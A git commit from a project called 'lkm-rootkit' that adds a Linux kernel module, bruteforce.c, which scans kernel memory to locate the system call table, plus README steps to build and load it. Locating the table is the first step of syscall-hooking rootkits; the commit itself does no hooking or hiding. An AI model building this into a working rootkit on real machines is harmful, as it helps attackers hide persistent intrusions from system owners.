6c43392c5fe973db9b3950ff3dcc3465bc231c38
Salma <SalmaFG@github.com>
2015-03-25 15:41:23 +0200

    Created bruteforce kernel module to find the Syscall table address

--- README.md
+++ README.md
@@ -1,2 +1,29 @@
 # lkm-rootkit
 A rootkit implemented as a linux kernel module
+
+Syscall table:
+--------------
+NOTICE:
+-------
+This kernel module is only compatible with 64-bit PCs.
+Please do NOT run if your PC is a 32-bit.
+
+
+
+To load the 'bruteforce' module:
+--------------------------------
+
+# make -f Makefile
+
+# sudo insmod bruteforce.ko
+
+# dmseg | tail
+
+
+
+To remove the module:
+---------------------
+
+# sudo rmmod bruteforce
+
+----------------------------------------------------------------------
---
+++ bruteforce.c
@@ -0,0 +1,66 @@
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/errno.h>
+#include <linux/types.h>
+#include <linux/unistd.h>
+#include <asm/current.h>
+#include <linux/sched.h>
+#include <linux/syscalls.h>
+#include <linux/init.h>
+ 
+MODULE_LICENSE("GPL");
+ 
+#define START_MEM   PAGE_OFFSET
+#define END_MEM     ULLONG_MAX
+ 
+unsigned long long *syscall_table; 
+ 
+unsigned long long **find(void) {
+ 
+    unsigned long long **sctable;
+    unsigned long int i = START_MEM;
+ 
+    while ( i < END_MEM) {
+ 
+        sctable = (unsigned long long **)i;
+ 
+        if ( sctable[__NR_close] == (unsigned long long *) sys_close) {
+ 
+            return &sctable[0];
+         }
+         
+        i += sizeof(void *);
+    }
+ 
+    return NULL;
+}
+ 
+static int init(void) {
+ 
+    printk("\nModule starting...\n");
+ 
+    syscall_table = (unsigned long long *) find();
+ 
+    if ( syscall_table != NULL ) {
+     
+        printk("Syscall table found at %llx\n", (unsigned long long ) syscall_table);
+     
+    } else {
+     
+        printk("Syscall table not found!\n");
+         
+    }   
+ 
+    return 0;
+}
+ 
+static void exit_(void) {
+ 
+    printk("Module ending\n");
+ 
+    return;
+}
+ 
+module_init(init);
+module_exit(exit_);
